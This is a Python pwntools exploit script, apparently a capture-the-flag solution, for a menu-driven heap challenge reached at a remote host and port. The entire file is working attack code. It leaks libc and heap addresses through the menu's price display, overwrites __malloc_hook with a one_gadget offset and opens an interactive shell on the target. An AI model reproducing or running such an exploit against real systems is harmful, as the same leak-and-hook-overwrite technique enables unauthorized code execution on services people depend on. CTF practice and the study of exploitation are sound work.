#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *

#host = "10.211.55.6"
#port = 8888

host = "200.200.200.103"
port = 51015

r = remote(host,port)

def addapart(name,apart,floor,desc):
    r.recvuntil(">")
    r.sendline("1")
    r.recvuntil("?")
    r.sendline(name)
    r.recvuntil("?")
    r.sendline(str(apart))
    r.recvuntil("?")
    r.sendline(str(floor))
    r.recvuntil(":")
    r.sendline(desc)

def change(types1,idx,types2):
    r.recvuntil(">")
    r.sendline("4")
    r.recvuntil(">")
    r.sendline("2")
    r.recvuntil(">")
    r.sendline(str(types1))
    r.recvuntil(">")
    r.sendline(str(idx))
    r.recvuntil(">")
    r.sendline(str(types2))

def ret():
    r.recvuntil(">")
    r.sendline("9")

def edit(types,idx):
    r.recvuntil(">")
    r.sendline("1")
    r.recvuntil(">")
    r.sendline(str(types))
    r.recvuntil(">")
    r.sendline(str(idx))


addapart("a"*0x400,1,1,"1")
change(1,1,2)
ret()
edit(3,1)

r.recvuntil("Normal price of menu : ")
libc = int(r.recvuntil("\n")[:-1]) - 0x3c3b78
print "libc:", hex(libc)
ret()
ret()
ret()
addapart("a",1,1,"2")
r.recvuntil(">")
r.sendline("4")
edit(3,1)

r.recvuntil("Normal price of menu : ")
heap = int(r.recvuntil("\n")[:-1])
print "heap:",hex(heap)

r.recvuntil(">")
r.sendline("6")
malloc_hook = libc + 0x3c3b10
r.recvuntil(":")
r.sendline(str(malloc_hook-0x10))
ret()
ret()
edit(1,2)
r.recvuntil(">")
r.sendline("1")
r.recvuntil(":")
magic = libc + 0xf0567
r.sendline("a"*0x10 + p64(magic))
ret()
ret()
ret()
r.interactive()


